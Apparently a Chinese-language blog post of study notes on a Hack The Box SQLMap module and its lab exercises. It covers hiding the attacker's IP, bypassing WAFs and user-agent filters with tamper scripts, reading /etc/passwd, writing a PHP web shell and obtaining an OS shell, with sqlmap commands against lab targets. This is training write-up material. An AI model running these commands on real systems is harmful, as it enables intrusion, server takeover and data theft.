+<h2 id="IP-Address-Concealing"><a href="#IP-Address-Concealing" class="headerlink" title="IP Address Concealing"></a>IP Address Concealing</h2><p>如果我们想隐藏我们的IP地址，或者某个网络应用程序有将我们当前的IP地址列入黑名单的保护机制，我们可以尝试使用代理或匿名网络Tor。可以使用选项–proxy设置代理（例如–proxy&#x3D;“socks4:&#x2F;&#x2F;177.39.187.70:33283”），我们应该在其中添加一个工作代理。 除此之外，如果我们有一个代理列表，我们可以通过选项–proxy-file将它们提供给SQLMap。这样，SQLMap将按顺序遍历列表，如果出现任何问题（例如，IP地址被列入黑名单），它将从列表中从当前跳到下一个。另一种选择是使用Tor网络来提供易于使用的匿名化，我们的IP可以出现在Tor出口节点的大列表中的任何位置。在本地计算机上正确安装后，本地端口9050或9150上应该有SOCKS4代理服务。通过使用开关–tor，SQLMap将自动尝试查找本地端口并适当地使用它。 如果我们想确保Tor被正确使用，以防止不必要的行为，我们可以使用开关——check Tor。在这种情况下，SQLMap将连接到<a target="_blank" rel="noopener" href="https://check.torproject.org/%E5%B9%B6%E6%A3%80%E6%9F%A5%E5%93%8D%E5%BA%94%E7%9A%84%E9%A2%84%E6%9C%9F%E7%BB%93%E6%9E%9C%EF%BC%88%E5%8D%B3%EF%BC%8C%E7%A5%9D%E8%B4%BA%E5%87%BA%E7%8E%B0%E5%9C%A8%E9%87%8C%E9%9D%A2%EF%BC%89%E3%80%82">https://check.torproject.org/并检查响应的预期结果（即，祝贺出现在里面）。</a></p>
+<h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><p>每当我们运行SQLMap时，作为初始测试的一部分，SQLMap都会使用不存在的参数名称（例如？pfov&#x3D;…）发送一个预定义的恶意负载，以测试WAF（Web应用程序防火墙）的存在。在用户和目标之间存在任何保护的情况下，与原始响应相比，响应将发生实质性变化。例如，如果实现了最流行的WAF解决方案之一（ModSecurity），那么在这样的请求之后应该会有一个406-不可接受的响应。为了识别实际的保护机制，SQLMap使用第三方库 <a target="_blank" rel="noopener" href="https://github.com/stamparm/identYwaf">identYwaf</a>，其中包含80种不同WAF解决方案的签名。如果我们想完全跳过这个启发式测试（即，产生更少的噪声），我们可以使用switch –skip-waf。</p>
+<h2 id="User-agent-Blacklisting-Bypass"><a href="#User-agent-Blacklisting-Bypass" class="headerlink" title="User-agent Blacklisting Bypass"></a>User-agent Blacklisting Bypass</h2><p>如果在运行SQLMap时出现即时问题（例如，从一开始就出现HTTP错误代码5XX），我们首先应该考虑的是SQLMap使用的默认用户代理（例如，用户代理：SQLMap&#x2F;1.4.9(<a target="_blank" rel="noopener" href="http://sqlmap.org))./">http://sqlmap.org))。</a> 使用开关-随机代理绕过这一点很简单，它使用从浏览器使用的大量值中随机选择的值来更改默认用户代理。</p>
+<blockquote>
+<p>注意：如果在运行过程中检测到某种形式的保护，我们可能会发现目标出现问题，甚至其他安全机制也会出现问题。主要原因是这种保护的不断发展和新的改进，给攻击者留下了越来越小的机动空间。</p>
+</blockquote>
+<h2 id="Tamper-Scripts"><a href="#Tamper-Scripts" class="headerlink" title="Tamper Scripts"></a>Tamper Scripts</h2><p>最后，在SQLMap中实现的绕过WAF&#x2F;IPS解决方案的最流行的机制之一是所谓的“篡改”脚本。篡改脚本是一种特殊的（Python）脚本，用于在将请求发送到目标之前修改请求，在大多数情况下是为了绕过一些保护。 例如，之间最流行的篡改脚本之一是将所有出现的大于运算符（&gt;）替换为NOT between 0 AND#，将等于运算符（&#x3D;）替换为between#AND#。通过这种方式，许多基本的保护机制（主要集中在防止XSS攻击）很容易被绕过，至少对于SQLi来说是这样。 篡改脚本可以一个接一个地链接在–Tamper选项中（例如–Tamper&#x3D;between，randomcase），在那里它们根据预定义的优先级运行。优先级是预先定义的，以防止任何不需要的行为，因为一些脚本通过修改其SQL语法来修改有效负载（例如ifnull2ifisull）。相反，一些篡改脚本并不关心内部内容（例如appendnullbyte）。 篡改脚本可以修改请求的任何部分，尽管大多数都会更改负载内容。</p>
+<p>为了获得实现的篡改脚本的完整列表，以及上面的描述，可以使用 <code>--list-tampers</code> 。我们还可以为任何自定义类型的攻击开发自定义篡改脚本，比如二阶SQLi。</p>
+<h2 id="Miscellaneous-Bypasses"><a href="#Miscellaneous-Bypasses" class="headerlink" title="Miscellaneous Bypasses"></a>Miscellaneous Bypasses</h2><p>在其他保护旁路机制中，还有两个机制需要提及。第一个是Chunked传输编码，使用开关Chunked打开，它将POST请求的主体拆分为所谓的“chunk”。列入黑名单的SQL关键字在chunk之间进行拆分，这样包含它们的请求就可以被忽略。 另一种绕过机制是HTTP参数污染（HPP），其中有效载荷以与情况类似的方式进行拆分——在不同的相同参数命名值之间分块（例如<code>？id=1&amp;id=UNION&amp;id=SELECT&amp;id=username，password&amp;id=FROM&amp;id=users…</code>），如果支持，则由目标平台连接（例如ASP）。</p>
+<h2 id="practice-4"><a href="#practice-4" class="headerlink" title="practice"></a>practice</h2><p><strong>What’s the contents of table flag8? (Case #8 anti-CSRF token bypass)</strong></p>
+<pre><code>sqlmap -u http://94.237.59.206:37390/case8.php --method POST --data &quot;id=1&amp;t0ken=2W13oyiefGY3lbZnUMqJytlCObM4kGlfTzigcsr50&quot; --csrf-token=&quot;t0ken&quot; --cookie=&quot;PHPSESSID=cv17jl24lbh9ohmg70nsm48t4v&quot; -D testdb -T flag8 --dump
+</code></pre>
+<p>需要去查看相关的负载和cookie</p>
+<p><strong>What’s the contents of table flag9? (Case #9 What’s the contents of table flag9? (Case #9))</strong></p>
+<pre><code>sqlmap -u &#39;http://94.237.60.119:58978/case9.php?id=1&amp;uid=753674357&#39; --randomize=&quot;uid&quot; -D testdb -T flag9 --dump
+</code></pre>
+<p><strong>What’s the contents of table flag10? (Case #10-Primitive protection )</strong></p>
+<p>这里正常payload一跑就出错，可能是用户代理有问题，根据报错提示加了一个<code>--random-agent</code>:</p>
+<pre><code>sqlmap -u &#39;http://94.237.60.119:58978/case10.php&#39; --method POST --data &quot;id=1&quot; -D testdb -T flag10 --dump --random-agent
+</code></pre>
+<p>这里其实把包写在文档中使用<code>-r</code>也可以直接注入</p>
+<p> <strong>What’s the contents of table flag11? (Case #11 Filtering of characters ‘&lt;’, ‘&gt;’)</strong></p>
+<p>着里按照题目提示会过滤两个符号，应该要用到Tamper脚本，先使用<code>--list-tampers</code>查找一下</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307141924212.png" alt="image-20230714192407146"></p>
+<p>应该只能是这个脚本了，虽然根据描述它没有修改‘&lt;’</p>
+<pre><code>sqlmap -u http://94.237.60.119:58978/case11.php?id=1 -D testdb -T flag11 --tamper=between --dump
+</code></pre>
+<h1 id="OS-Exploitation"><a href="#OS-Exploitation" class="headerlink" title="OS Exploitation"></a>OS Exploitation</h1><p>SQLMap能够利用SQL注入从DBMS外部的本地系统读取和写入文件。如果我们有适当的权限，SQLMap还可以尝试在远程主机上直接执行命令。</p>
+<h2 id="File-Read-x2F-Write"><a href="#File-Read-x2F-Write" class="headerlink" title="File Read&#x2F;Write"></a>File Read&#x2F;Write</h2><p>通过SQL注入漏洞进行操作系统攻击的第一部分是在托管服务器上读取和写入数据。读取数据比写入数据要常见得多，写入数据在现代数据库管理系统中具有严格的特权，因为它可能会导致系统利用，正如我们将看到的那样。例如，在MySql中，要读取本地文件，DB用户必须具有LOAD DATA和INSERT的权限，才能将文件的内容加载到表中，然后读取该表。 此类命令的一个示例是：</p>
+<ul>
+<li><code>LOAD DATA LOCAL INFILE &#39;/etc/passwd&#39; INTO TABLE passwd;</code></li>
+</ul>
+<h2 id="Checking-for-DBA-Privileges"><a href="#Checking-for-DBA-Privileges" class="headerlink" title="Checking for DBA Privileges"></a>Checking for DBA Privileges</h2><p>要检查我们是否具有SQLMap的DBA权限，我们可以使用–is-DBA选项：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/case1.php?id=1&quot; --is-dba
+...SNIP...
+current user is DBA: False
+</code></pre>
+<h2 id="Reading-Local-Files"><a href="#Reading-Local-Files" class="headerlink" title="Reading Local Files"></a>Reading Local Files</h2><p>与通过SQLi手动注入上述行不同，SQLMap使用–file read选项使读取本地文件变得相对容易：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-read &quot;/etc/passwd&quot;
+...SNIP...
+[17:40:14] [INFO] the local file &#39;~/.sqlmap/output/www.example.com/files/_etc_passwd&#39; and the remote file &#39;/etc/passwd&#39; have the same size (982 B)
+files saved to [1]:
+[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)
+</code></pre>
+<p>正如我们所看到的，SQLMap说文件保存到本地文件。我们可以对本地文件进行cat以查看其内容</p>
+<h2 id="Writing-Local-Files"><a href="#Writing-Local-Files" class="headerlink" title="Writing Local Files"></a>Writing Local Files</h2><p>当它向托管服务器写入文件时，在现代DMBS中变得更加受限，因为我们可以利用它在远程服务器上编写Web Shell，从而执行代码并接管服务器。 这就是为什么现代DBMS默认情况下禁用文件写入，并且需要DBA的某些权限才能写入文件。例如，在MySql中，必须手动禁用–secure file priv配置，以允许使用into OUTFILE SQL查询将数据写入本地文件，此外还需要主机服务器上的任何本地访问权限，如在我们需要的目录中写入的权限。 尽管如此，许多web应用程序都要求DBMS能够将数据写入文件，因此值得测试我们是否可以将文件写入远程服务器。要使用SQLMap做到这一点，我们可以使用–file write和–file dest选项。首先，让我们准备一个基本的PHP web shell，并将其写入shell.PHP文件.</p>
+<p>现在，让我们尝试在远程服务器上的&#x2F;var&#x2F;www&#x2F;html&#x2F;目录中编写此文件，该目录是Apache的默认服务器webroot。如果我们不知道服务器webroot，我们将看到SQLMap如何自动找到它。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --file-write &quot;shell.php&quot; --file-dest &quot;/var/www/html/shell.php&quot;
+</code></pre>
+<h2 id="OS-Command-Execution"><a href="#OS-Command-Execution" class="headerlink" title="OS Command Execution"></a>OS Command Execution</h2><p>现在我们确认了我们可以编写一个PHP shell来执行命令，我们可以测试SQLMap的能力，它可以为我们提供一个简单的操作系统shell，而无需手动编写远程shell。SQLMap利用各种技术通过SQL注入漏洞获取远程shell，比如像我们刚才所做的那样编写远程shell，编写执行命令和检索输出的SQL函数，甚至使用一些直接执行OS命令的SQL查询，比如Microsoft SQL Server中的xp_cmdshell。要获得带有SQLMap的操作系统外壳，我们可以使用–OS-shell选项，如下所示：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --os-shell
+...SNIP...
+[18:02:37] [INFO] the local file &#39;/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so&#39; and the remote file &#39;./libslpjs.so&#39; have the same size (8040 B)
+[18:02:37] [INFO] creating UDF &#39;sys_exec&#39; from the binary UDF file
+[18:02:38] [INFO] creating UDF &#39;sys_eval&#39; from the binary UDF file
+[18:02:39] [INFO] going to use injected user-defined functions &#39;sys_eval&#39; and &#39;sys_exec&#39; for operating system command execution
+[18:02:39] [INFO] calling Linux OS shell. To quit type &#39;x&#39; or &#39;q&#39; and press ENTER
+
+os-shell&gt; ls -la
+do you want to retrieve the command standard output? [Y/n/a] a
+
+[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+No output
+</code></pre>
+<p>我们看到SQLMap默认使用UNION技术来获得操作系统外壳，但最终未能给我们任何输出No output。因此，正如我们已经知道的那样，我们有多种类型的SQL注入漏洞，让我们尝试指定另一种更有可能为我们提供直接输出的技术，如基于错误的SQL注入，我们可以用–technique&#x3D;E指定它：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqlmap -u &quot;http://www.example.com/?id=1&quot; --os-shell --technique=E
+</code></pre>
+<h2 id="practice-5"><a href="#practice-5" class="headerlink" title="practice"></a>practice</h2><p><strong>Try to use SQLMap to read the file “&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt”.</strong></p>
+<pre><code>sqlmap -u http://94.237.50.62:39989/?id=1 --file-read &quot;/var/www/html/flag.txt&quot;
+</code></pre>
+<p>（既然要拿到shell那么这一步好像没啥必要）</p>
+<p><strong>Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.</strong></p>
+<pre><code>sqlmap -u http://94.237.50.62:39989/?id=1 --os-shell
+</code></pre>
+<p>这里加一个<code>--technique=E</code>应该能够更加丝滑地拿到shell；拿到shell之后目录是锁定的，只能find检索一下flag位置然后直接读取</p>
+<h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1><p>您可以访问具有基本保护机制的web应用程序。使用本模块中学习的技能，通过SQLMap查找SQLi漏洞并进行相应的攻击。要完成此模块，请找到标志并在此处提交。</p>
+<blockquote>
+<p>target:83.136.253.168:50653</p>
+<p>What’s the contents of table final_flag?</p>
+</blockquote>
+<p>在网页上浏览，在blog目录中看到了一个查询接口，本章讲的是sqli那么漏洞应该就是这里了（有点取巧了bushi），但是发现没什么反应乌鱼子只能找找其他地方</p>
+<p>突然发现有一个POST包，应该是点击加入购物车触发的，它发送了一个json文件</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307142024688.png" alt="image-20230714202432615"></p>
+<p>用这个包打打看，先直接看看能不能拿到shell</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307142035598.png" alt="image-20230714203535534"></p>
+<p>这里显示有防火墙或者一些过滤规则，让程序接着跑一会，再开一个窗口试试常规的数据库检索，万一flag在数据库里呢？</p>
+<p>但是发现一样的卡住了，这里怎么说呢，还是只能取巧试一试之前的绕过方式，在之前的文档中用到的tamper这里也拥有一下（一般而言这个模块是这样的）……然后就好家伙，用between报错了没了hh~</p>
+<p>这里还是卡住了跑了二十分钟没反应了无语，最后查了一下最终的payload长这样：</p>
+<pre><code>sqlmap -r test.txt -D production -T final_flag --tamper=between --dbms=Mysql --technique=T --dump
+</code></pre>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
